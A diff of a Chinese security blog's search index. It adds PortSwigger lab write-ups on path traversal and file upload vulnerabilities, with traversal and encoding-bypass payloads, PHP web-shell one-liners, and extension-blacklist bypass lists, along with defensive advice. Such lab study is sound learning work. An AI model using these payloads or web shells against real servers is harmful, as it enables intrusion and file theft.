     <content><![CDATA[<h2 id="什么是路径遍历">什么是路径遍历</h2>
@@ -5149,6 +5679,184 @@ jpg上传成功，php上传失败，随便后缀上传成功，因此后端黑�
       <categories>
         <category>靶场练习</category>
         <category>PortSwigger靶场</category>
+      </categories>
+      <tags>
+        <tag>PortSwigger靶场</tag>
+        <tag>路径遍历</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【PortSwigger学院】路径遍历</title>
+    <url>/posts/15b3971d/</url>
+    <content><![CDATA[<h2 id="什么是路径遍历">什么是路径遍历</h2>
+<p>路径遍历也称为目录遍历。这些漏洞可使攻击者在运行应用程序的服务器上读取任意文件。这可能包括：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>应用程序代码和数据</p>
+</li>
+<li class="lvl-2">
+<p>后端系统的凭证</p>
+</li>
+<li class="lvl-2">
+<p>敏感的操作系统文件。</p>
+</li>
+</ul>
+<p>在某些情况下，攻击者可能能够写入服务器上的任意文件，从而修改应用程序数据或行为，并最终完全控制服务器。</p>
+<span id="more"></span>
+<h2 id="通过路径遍历读取任意文件">通过路径遍历读取任意文件</h2>
+<h3 id="Lab-File-path-traversal-simple-case">Lab: File path traversal, simple case</h3>
+<p>想象一下，一个购物应用程序会显示待售商品的图片。可以使用以下 HTML 加载图片：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>loadImage </code>URL 接收一个<code>filename</code>参数，并返回指定文件的内容。图像文件存储在磁盘的 <code>/var/www/images/</code>  目录中。要返回图像，应用程序会将请求的文件名追加到该基本目录，并使用文件系统 API 读取文件内容。换句话说，应用程序会从以下文件路径读取内容：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/images/218.png</span><br></pre></td></tr></table></figure>
+<p>该应用程序没有针对路径遍历攻击实施任何防御措施。因此，攻击者可以请求以下 URL，从服务器文件系统中检索 /etc/passwd 文件：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=../</span>..<span class="regexp">/../</span>etc/passwd</span><br></pre></td></tr></table></figure>
+<p>这将导致应用程序从以下文件路径读取数据：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>www<span class="regexp">/images/</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+<p><code>../</code>序列在文件路径中有效，表示在目录结构中上移一级。连续三个<code>../</code>顺序从 <code>/var/www/images/ </code>上移到文件系统根目录，因此实际读取的文件是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>在基于 Unix 的操作系统上，这是一个标准文件，包含服务器上注册用户的详细信息，但攻击者可以使用相同的技术检索其他任意文件。</p>
+<p>在 Windows 系统中，…/ 和 …\都是有效的目录遍历序列。下面是一个针对基于 Windows 的服务器的等效攻击示例：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">https:<span class="string">//insecure-website.com/loadImage</span>?filename=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\windows\win.ini</span><br></pre></td></tr></table></figure>
+<p>该实验室在显示产品图像时存在路径遍历漏洞。要解决该实验问题，请检索 <code>/etc/passwd </code>文件的内容。</p>
+<p><img src="/posts/15b3971d//image-20250430160204983.png" alt="image-20250430160204983"></p>
+<p>这一题很简单。把参数改一下就可以了。</p>
+<h2 id="利用路径遍历漏洞的常见障碍">利用路径遍历漏洞的常见障碍</h2>
+<h3 id="Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab: File path traversal, traversal sequences blocked with absolute path bypass</h3>
+<p>许多将用户输入置入文件路径的应用程序都有针对路径遍历攻击的防御措施。这些防御措施往往可以被绕过。</p>
+<p>如果应用程序从用户提供的文件名中删除或阻止目录遍历序列，就有可能利用各种技术绕过防御。</p>
+<p>您可以使用文件系统根目录下的绝对路径（如 <code>filename=/etc/passwd</code>）来直接引用文件，而无需使用任何遍历序列。</p>
+<p>该实验室在显示产品图像时存在路径遍历漏洞。应用程序会阻止遍历序列，但会将所提供的文件名视为默认工作目录的相对文件名。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>这道题阻止了相对目录遍历序列，但是可以用绝对路径</p>
+</li>
+</ul>
+<p><img src="/posts/15b3971d//image-20250430162204471.png" alt="image-20250430162204471"></p>
+<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-non-recursively">Lab: File path traversal, traversal sequences stripped non-recursively</h3>
+<p>您或许可以使用嵌套遍历序列，如 …// 或 …//。当内部序列被剥离时，这些序列会恢复为简单的遍历序列。</p>
+<p>该实验室在显示产品图像时存在路径遍历漏洞。在使用用户提供的文件名之前，应用程序会从该文件名中删除路径遍历序列。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>使用<code>....//....//....//etc//passwd</code>遍历是可以的，但是<code>//etc//passwd</code>不行。</p>
+</li>
+</ul>
+<p><img src="/posts/15b3971d//image-20250430163057050.png" alt="image-20250430163057050"></p>
+<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode">Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h3>
+<p>在某些情况下，例如在 URL 路径或<code>multipart/form-data</code>  请求的<code>filename</code>参数中，网络服务器可能会在将您的输入传递给应用程序之前去掉任何目录遍历序列。有时，您可以通过 URL 编码，甚至是双重 URL  编码来绕过这种清理。这将分别导致 <code>%2e%2e%2f</code> 和 <code>%252e%252e%252f</code>。各种非标准编码，如 <code>..%c0%af</code> 或  <code>..%ef%bc%8f</code> 也可以使用。</p>
+<p>该实验室在显示产品图像时存在路径遍历漏洞。应用程序会阻止包含路径遍历序列的输入。然后在使用输入之前对其进行 URL 解码。要解决本实验问题，请检索 /etc/passwd 文件的内容。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>url单层编码访问失败，双重编码成功。服务器会对HTTP请求双重url解码。这里把<code>../</code>换成<code>%252e%252e%252f</code>或者<code>..%252f</code>就可以了。</p>
+</li>
+</ul>
+<p><img src="/posts/15b3971d//image-20250430165746276.png" alt="image-20250430165746276"></p>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        为什么服务器会进行双重解码？
+    </div>
+    <div class="spoiler-content">
+        <p>可能的情况是，服务器在处理请求的时候，可能在不同的层次上多次进行URL解码。比如，Web服务器（如Apache或Nginx）可能先进行一次解码，然后应用框架（如PHP、Python的Flask等）可能再进行一次解码。如果两次解码之间没有对路径进行正确的规范化或安全检查，就会导致攻击者通过双重编码绕过一些安全检测。</p>
+
+    </div>
+</div>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        有没有可能只解码一次或者更多次？
+    </div>
+    <div class="spoiler-content">
+        <p>当然有可能。这取决于服务器的配置和代码实现。如果服务器只进行一次解码，那么攻击者需要直接使用单次编码的字符，例如<code>%2e%2f%2e%2e</code>等。而如果服务器解码次数超过两次，比如三次，那么攻击者可能需要使用三重编码，比如<code>%2525252e</code>（假设三重编码的话）。不过这种情况比较少见，因为通常服务器不会多次解码。</p>
+
+    </div>
+</div>
+<h3 id="Lab-File-path-traversal-validation-of-start-of-path">Lab: File path traversal, validation of start of path</h3>
+<p>应用程序可能要求用户提供的文件名以预期的基本文件夹开始，如 <code>/var/www/images</code>。在这种情况下，可以在所需的基本文件夹后加上适当的遍历序列。例如：<code>filename=/var/www/images/.../.../.../etc/passwd</code></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>我用了url编码，不使用url编码也是可以的，这里单层解码，双层就不行了</p>
+</li>
+</ul>
+<p><img src="/posts/15b3971d//image-20250430171637924.png" alt="image-20250430171637924"></p>
+<h3 id="Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab: File path traversal, validation of file extension with null byte bypass</h3>
+<p>应用程序可能要求用户提供的文件名以预期的文件扩展名结尾，如 .png。在这种情况下，可以使用空字节在所需扩展名之前有效地终止文件路径。例如：filename=…/…/…/etc/passwd%00.png。</p>
+<p>本实验室在显示产品图像时存在路径遍历漏洞。应用程序会验证所提供的文件名是否以预期的文件扩展名结尾。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
+<p>这个感觉好牛啊，希望自己慢慢积累，积跬步至千里吧。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>相对路径后加<code>%00.png</code>绕过文件后缀验证</p>
+</li>
+</ul>
+<p><img src="/posts/15b3971d//image-20250430172259167.png" alt="image-20250430172259167"></p>
+<h2 id="如何防止路径遍历攻击">如何防止路径遍历攻击</h2>
+<p>防止路径遍历漏洞的最有效方法是完全避免将用户提供的输入传递给文件系统 API。许多这样做的应用程序函数都可以重写，以更安全的方式提供相同的行为。</p>
+<p>如果无法避免将用户提供的输入传递给文件系统 API，我们建议使用两层防御来防止攻击：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>在处理用户输入之前对其进行验证。理想情况下，将用户输入与允许值白名单进行比较。如果做不到这一点，则要验证输入是否只包含允许的内容，例如只包含字母数字字符。</p>
+</li>
+<li class="lvl-2">
+<p>验证所提供的输入后，将输入追加到基本目录，并使用平台文件系统 API 对路径进行规范化。验证规范化路径是否以预期的基本目录开始。</p>
+</li>
+</ul>
+<p>下面是一个根据用户输入验证文件规范路径的简单 Java 代码示例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>代码逐行解析：</strong></p>
+<ol>
+<li class="lvl-3">
+<p>创建文件对象</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br></pre></td></tr></table></figure>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><strong><code>File</code>类</strong>：Java中用于表示文件或目录路径的类。</p>
+</li>
+<li class="lvl-2">
+<p><strong>构造函数参数</strong>：</p>
+<ul class="lvl-2">
+<li class="lvl-4"><code>BASE_DIRECTORY</code>：预定义的基础目录（如<code>/safe/path</code>），用于限制文件访问范围。</li>
+<li class="lvl-4"><code>userInput</code>：用户输入的路径（如<code>data.txt</code>或<code>../../secret.txt</code>）。</li>
+</ul>
+</li>
+<li class="lvl-2">
+<p><strong>作用</strong>：将两者拼接成完整路径。例如：</p>
+<ul class="lvl-2">
+<li class="lvl-4">若<code>BASE_DIRECTORY</code>是<code>/safe</code>，<code>userInput</code>是<code>file.txt</code>，则拼接为<code>/safe/file.txt</code>。</li>
+<li class="lvl-4">若<code>userInput</code>是<code>../etc/passwd</code>，则拼接为<code>/safe/../etc/passwd</code>。</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li class="lvl-3">
+<p>路径规范化验证</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// 处理文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><strong><code>getCanonicalPath()</code></strong>：将路径转换为<strong>绝对且唯一</strong>的规范形式：</p>
+<ul class="lvl-2">
+<li class="lvl-4">解析<code>.</code>（当前目录）和<code>..</code>（上级目录）。</li>
+<li class="lvl-4">去除多余的斜杠（如<code>/safe//file</code>变为<code>/safe/file</code>）。</li>
+<li class="lvl-4">解析符号链接（如将快捷方式转为真实路径）。</li>
+</ul>
+<p>例如：<code>/safe/../etc/passwd</code> 会被规范化为 <code>/etc/passwd</code>。</p>
+</li>
+<li class="lvl-2">
+<p><strong><code>startsWith(BASE_DIRECTORY)</code></strong>：检查规范路径是否以<code>BASE_DIRECTORY</code>开头。</p>
+<ul class="lvl-2">
+<li class="lvl-4">若用户输入合法（如<code>data.txt</code>），规范路径为<code>/safe/data.txt</code>，验证通过。</li>
+<li class="lvl-4">若用户输入非法（如<code>../../etc/passwd</code>），规范路径为<code>/etc/passwd</code>，验证失败。</li>
+</ul>
+</li>
+</ul>
+<p>但是这段代码应该有一定的问题，就是只要保证文件路径与<code>BASE_DIRECTORY</code>一致即可。比如说，如果<code>BASE_DIRECTORY</code>是<code>/base</code>便可以构造<code>/baseXXXX</code>越权访问与文件开头与<code>BASE_DIRECTORY</code>一致的同级目录。</p>
+<p>本文参考：</p>
+<p><a href="https://portswigger.net/web-security/file-path-traversal">Path traversal</a></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>文件上传</category>
       </categories>
       <tags>
         <tag>PortSwigger靶场</tag>
@@ -5673,22 +6381,531 @@ AddType application/x-httpd-php .php</p>
         <category>PortSwigger靶场</category>
       </categories>
       <tags>
-        <tag>文件上传</tag>
         <tag>PortSwigger靶场</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
-    <title>【pikachu靶场】docker搭建pikachu靶场</title>
-    <url>/posts/712580ba/</url>
-    <content><![CDATA[<p>pikachu靶场的搭建其实是比较简单的，但是我在使用docker搭建pikachu靶场的时候遇到了几个问题，使我有了一些感悟，因此特意写篇博客记录一下。</p>
+    <title>【PortSwigger学院】文件上传</title>
+    <url>/posts/34bab347/</url>
+    <content><![CDATA[<h2 id="原理与危害">原理与危害</h2>
+<p>文件上传漏洞是指网络服务器允许用户上传文件到其文件系统，而未对文件名、类型、内容或大小等进行充分验证。这就可能导致允许攻击者上传有潜在危险的文件，甚至可能包括支持远程代码执行的服务器端脚本文件。</p>
+<p>在某些情况下，上传文件本身就足以造成破坏。其他攻击可能涉及对文件的后续 HTTP 请求，通常是为了触发服务器执行文件。</p>
 <span id="more"></span>
-<p>因为我已经在服务器上搭好了pikachu靶场，所以这里我用CentOS 7在虚拟机再复现一次。</p>
+<h2 id="文件上传漏洞的影响">文件上传漏洞的影响</h2>
+<p>文件上传漏洞的影响通常取决于两个关键因素：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>网站未能正确验证文件的哪个方面，无论是文件大小、类型还是内容等。</p>
+</li>
+<li class="lvl-2">
+<p>文件上传成功后，对文件施加了哪些限制。</p>
+</li>
+</ul>
+<p>在最坏的情况下，文件类型没有得到正确验证，服务器配置允许某些类型的文件（如 .php 和 .jsp）作为代码执行。在这种情况下，攻击者有可能上传一个服务器端代码文件，该文件可作为 web shell 使用，就可以完全控制服务器。</p>
+<p>如果文件名没有得到正确验证，攻击者只需上传同名文件，就能覆盖关键文件。如果服务器还存在目录遍历漏洞，这就意味着攻击者甚至可以将文件上传到意想不到的位置，比如覆盖服务器的系统文件。</p>
+<p>如果不能确保文件大小在预期的阈值范围内，还可能导致某种形式的拒绝服务（DoS）攻击，即攻击者填满可用磁盘空间。</p>
+<h2 id="文件上传漏洞是如何产生的">文件上传漏洞是如何产生的</h2>
+<p>因为文件上传漏洞巨大的危害性，网站很少会对允许用户上传的文件不加任何限制。更常见的情况是，开发人员实施他们认为强大的验证，但这种验证要么存在固有缺陷，要么很容易被绕过。</p>
+<p>例如，它们可能试图将危险文件类型列入黑名单，但在检查文件扩展名时却没有考虑到解析差异。与任何黑名单一样，黑名单也很容易不小心遗漏更隐蔽的文件类型，而这些文件类型可能仍然具有危险性。</p>
+<p>在其他情况下，网站可能会尝试通过验证属性来检查文件类型，而这些属性很容易被使用 Burp Proxy 或 Repeater 等工具的攻击者操纵。</p>
+<p>最后，即使是强大的验证措施，在构成网站的主机和目录网络中的应用也可能不一致，从而导致可被利用的差异。</p>
+<h2 id="网络服务器如何处理静态文件请求">网络服务器如何处理静态文件请求</h2>
+<p>在了解如何利用文件上传漏洞之前，您必须对服务器如何处理静态文件请求有一个基本的了解。</p>
+<p>过去，网站几乎完全由静态文件组成，当用户提出请求时，网站就会向用户提供静态文件。因此，每个请求的路径都可以与服务器文件系统中的目录和文件层次结构进行 1:1  的映射。如今，网站越来越动态化，请求的路径往往与文件系统没有任何直接关系。不过，网络服务器仍然要处理一些静态文件的请求，包括样式表、图像等。</p>
+<p>处理这些静态文件的流程大致相同。服务器会解析请求中的路径，以确定文件扩展名。然后，服务器根据扩展名和 MIME 类型之间的预配置映射列表来确定请求的文件类型。接下来会发生什么取决于文件类型和服务器配置。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>如果该文件类型不可执行，如图像或静态 HTML 页面，服务器可能只会在 HTTP 响应中向客户端发送文件内容。</p>
+</li>
+<li class="lvl-2">
+<p>如果文件类型是可执行的，如 PHP 文件，且服务器被配置为执行此类文件，那么在运行脚本之前，服务器会根据 HTTP 请求中的头和参数来分配变量。由此产生的输出结果会在 HTTP 响应中发送给客户端。</p>
+</li>
+<li class="lvl-2">
+<p>如果文件类型是可执行的，但服务器未配置为执行该类型的文件，则通常会响应错误。不过，在某些情况下，文件内容仍会以纯文本形式提供给客户端。这种错误配置偶尔会被利用来泄露源代码和其他敏感信息。</p>
+</li>
+</ul>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        TIPS
+    </div>
+    <div class="spoiler-content">
+        <p><code>Content-Type</code> 响应头可提供服务器认为它已提供的文件类型的线索。如果应用程序代码没有明确设置该标头，它通常包含文件扩展名/MIME 类型映射的结果。</p>
+
+    </div>
+</div>
+<h2 id="利用不受限制的文件上传部署网络外壳">利用不受限制的文件上传部署网络外壳</h2>
+<p>从安全角度来看，最糟糕的情况是网站允许您上传服务器端脚本（如 PHP、Java 或 Python 文件），并将其配置为代码执行。这样，在服务器上创建自己的网络外壳就变得轻而易举了。</p>
+<blockquote>
+<p>Web shell</p>
+<p>Web shell是一种恶意脚本，攻击者只需向正确的端点发送 HTTP 请求，就能在远程网络服务器上执行任意命令</p>
+</blockquote>
+<p>如果你能成功上传Web shell，你实际上就拥有了对服务器的完全控制权。这意味着你可以读写任意文件、外泄敏感数据，甚至利用服务器对内部基础架构和网络外的其他服务器进行透视攻击。例如，可以使用下面的 PHP 单行程序从服务器的文件系统中读取任意文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/target/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一旦上传，发送对该恶意文件的请求就会在响应中返回目标文件的内容。</p>
+<h4 id="Lab-通过Web-shell-上传远程执行代码">Lab: 通过Web shell 上传远程执行代码</h4>
+<p>本实验室包含一个易受攻击的图片上传功能。在将用户上传的文件存储到服务器文件系统之前，它没有对这些文件执行任何验证。</p>
+<p>要解决该实验问题，请上传一个基本的<code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
+<p>要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
+<p>您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
+<ol>
+<li class="lvl-3">
+<p>登录题目给的账户后，可以上传头像</p>
+</li>
+</ol>
+<p><img src="/posts/34bab347//image-20250430120836773.png" alt="image-20250430120836773"></p>
+<ol start="2">
+<li class="lvl-3">
+<p>上传1.php文件</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/home/carlos/secret&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/34bab347//image-20250430120903346.png" alt="image-20250430120903346"></p>
+<ol start="3">
+<li class="lvl-3">
+<p>打开图像</p>
+</li>
+</ol>
+<p><img src="/posts/34bab347//image-20250430121009450.png" alt="image-20250430121009450"></p>
+<p>总结：前端无防护、后端无防护、服务器具备执行条件。</p>
+<h2 id="利用文件上传验证的缺陷">利用文件上传验证的缺陷</h2>
+<p>在网络中，你不太可能发现一个网站像我们在上一个实验室中看到的那样，对文件上传攻击没有任何防护措施。但是，有了防御措施，并不意味着它们就是强大的。有时，你仍然可以利用这些机制中的漏洞来获取网络外壳，从而远程执行代码。</p>
+<h3 id="文件类型验证存在缺陷">文件类型验证存在缺陷</h3>
+<p>在提交 HTML 表单时，浏览器通常会在 <code>POST </code>请求中发送所提供的数据，内容类型为  <code>application/x-www-form-url-encoded</code>。这对于发送简单的文本（如姓名或地址）很合适。但它不适合发送大量二进制数据，如整个图像文件或 PDF 文档。在这种情况下，首选内容类型为 <code>multipart/form-data</code>。</p>
+<p>考虑一个包含上传图片、提供图片说明和输入用户名等字段的表单。提交这样的表单后，可能会得到类似下面的请求：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /images HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line">    Content-Length: <span class="number">12345</span></span><br><span class="line">    Content-<span class="type">Type</span>: multipart/form-data; boundary=---------------------------012345678901234567890123456</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;image&quot;</span>; filename=<span class="string">&quot;example.jpg&quot;</span></span><br><span class="line">    Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">    [...binary content of example.jpg...]</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;description&quot;</span></span><br><span class="line"></span><br><span class="line">    This <span class="keyword">is</span> an interesting description of my image.</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;username&quot;</span></span><br><span class="line"></span><br><span class="line">    wiener</span><br><span class="line">    ---------------------------012345678901234567890123456--</span><br></pre></td></tr></table></figure>
+<p>正如你所看到的，消息正文被分割成不同的部分，分别用于表单的每个输入。每个部分都包含一个 <code>Content-Disposition</code>  标头，它提供了与输入字段相关的一些基本信息。这些单独的部分还包含自己的 <code>Content-Type</code> 标头，告诉服务器使用此输入提交的数据的  MIME 类型。</p>
+<p>网站尝试验证文件上传的一种方法是检查特定于输入的 Content-Type 标头是否与预期的 MIME  类型相匹配。例如，如果服务器只接收图像文件，它可能只允许图像/jpeg 和图像/png  等类型。当服务器默认信任该标头的值时，就会出现问题。如果不执行进一步的验证来检查文件内容是否真的与假定的 MIME 类型相匹配，就可以使用  Burp Repeater 等工具轻松绕过这一防御。</p>
+<h4 id="Lab-绕过内容类型限制上传网络外壳">Lab: 绕过内容类型限制上传网络外壳</h4>
+<p>本实验室包含一个易受攻击的图片上传功能。它试图防止用户上传意外的文件类型，但需要依靠检查用户可控输入来验证。</p>
+<p>要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
+<p>您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
+<ol>
+<li class="lvl-3">
+<p>上传PHP代码发现进行了前端防护</p>
+</li>
+</ol>
+<p><img src="/posts/34bab347//image-20250430123852944.png" alt="image-20250430123852944"></p>
+<ol start="2">
+<li class="lvl-3">
+<p>将Content-Type修改为符合规定的内容，php代码不变，即可上传成功</p>
+</li>
+</ol>
+<p><img src="/posts/34bab347//image-20250430123908753.png" alt="image-20250430123908753"></p>
+<ol start="3">
+<li class="lvl-3">
+<p>访问账户的头像通关</p>
+</li>
+</ol>
+<p><img src="/posts/34bab347//image-20250430123725160.png" alt="image-20250430123725160"></p>
+<p>总结：前端防护，限制上传的文件类型，通过Burp Suitte 修改文件名绕过检测。后端无防护，服务器具备执行条件。</p>
+<h3 id="防止在用户可访问的目录中执行文件">防止在用户可访问的目录中执行文件</h3>
+<p>虽然从一开始就防止上传危险文件类型显然更好，但第二道防线阻止服务器执行任何漏网脚本。</p>
+<p>为谨慎起见，服务器通常只运行其 MIME 类型已明确配置为可执行的脚本。否则，它们可能只会返回某种错误信息，或者在某些情况下，以纯文本形式提供文件内容：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /static/exploit.php?command=<span class="built_in">id</span> HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">    Content-<span class="type">Type</span>: text/plain</span><br><span class="line">    Content-Length: <span class="number">39</span></span><br><span class="line"></span><br><span class="line">    &lt;?php echo system($_GET[<span class="string">&#x27;command&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>这种行为本身可能很有趣，因为它提供了一种泄漏源代码的方法，但它使任何创建网络 shell 的尝试都化为乌有。</p>
+<p>这种配置通常因目录而异。上传用户提供文件的目录可能比文件系统中其他位置的控制要严格得多，因为其他位置被认为是最终用户无法访问的。如果你能找到一种方法，将脚本上传到另一个不应该包含用户提供文件的目录，那么服务器终究可能会执行你的脚本。</p>
+<p><font class="notice">注意：网络服务器通常使用<code>multipart/form-data</code>请求中的文件名字段来确定文件的名称和保存位置。</font></p>
+<h4 id="Lab：通过路径遍历上传网络-shell">Lab：通过路径遍历上传网络 shell</h4>
+<p>该实验室包含一个易受攻击的图片上传功能。服务器被配置为防止执行用户提供的文件，但可通过利用次要漏洞（文件路径遍历）绕过此限制。要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>按照以往的方式访问自己上传的php代码，服务器直接将php代码以文本方式返回</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250430183245601.png" alt="image-20250430183245601"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>修改<code>filename</code>目录遍历语句被服务器清理</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250430183451599.png" alt="image-20250430183451599"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>使用url编码上传成功</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250430183708967.png" alt="image-20250430183708967"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>访问即可</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250430183739696.png" alt="image-20250430183739696"></p>
+<p>您还应注意，尽管您可能会将所有请求发送到同一域名，但这通常指向某种反向代理服务器，如负载平衡器。您的请求通常会由其他服务器在幕后处理，这些服务器的配置也可能不同。</p>
+<h3 id="危险文件类型黑名单不足">危险文件类型黑名单不足</h3>
+<p>防止用户上传恶意脚本的一个比较明显的方法是将 <code>.php</code>  等潜在危险的文件扩展名列入黑名单。黑名单的做法本质上是有缺陷的，因为很难明确阻止每一个可能用于执行代码的文件扩展名。有时可以通过使用较不知名的、仍可执行的替代文件扩展名（如 <code>.php5</code>、<code>.shtml</code> 等）来绕过此类黑名单。针对这种防护，可以尝试以下几种方式进行绕过：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>使用不常见的后缀名：<code>php5,pht,phpt,phtml,php3,php4,php5,php6</code></p>
+</li>
+<li class="lvl-2">
+<p>使用大小写：<code>.pHp</code></p>
+</li>
+<li class="lvl-2">
+<p>重写服务器配置文件：apache的<code>.htaccess</code>或者IIS的<code>web.config</code></p>
+</li>
+<li class="lvl-2">
+<p>使用多扩展名，譬如<code>example.php.jpg</code>，这种方式依赖于服务器如何解析文件，如果服务器<strong>从前往后解析，并且解析到第一个扩展名就停止解析</strong>，则该文件会被当作<code>example.php</code>存储</p>
+</li>
+<li class="lvl-2">
+<p>添加尾随字符，有些组件可能会过滤或忽视文件名末尾的空格或小数点，譬如<code>example.php.</code>或<code>example.php </code> (末尾有一个空格)</p>
+</li>
+<li class="lvl-2">
+<p>尝试使用url编码，譬如：<code>example%2ephp</code></p>
+</li>
+<li class="lvl-2">
+<p>再文件扩展名前添加分号或者url编码的空字符，譬如：<code>example.php;jpg</code>或<code>example.php%00.jpg</code></p>
+</li>
+<li class="lvl-2">
+<p>使用多字节Unicode字符，譬如Unicode字符序列：<code>xC0 xAE</code>，<code>xC4 xAE</code>，<code>xC0 x2E</code>再utf-8编码下可能转化为<code>x2E</code>，然后转化为ASCII字符使用</p>
+</li>
+</ul>
+<h4 id="覆盖服务器配置">覆盖服务器配置</h4>
+<p>正如我们在上一节所讨论的，除非经过配置，否则服务器通常不会执行文件。例如，若允许 Apache 服务器执行客户端请求的 PHP 文件，开发人员需要在 <code>/etc/apache2/apache2.conf</code> 文件中添加以下指令：</p>
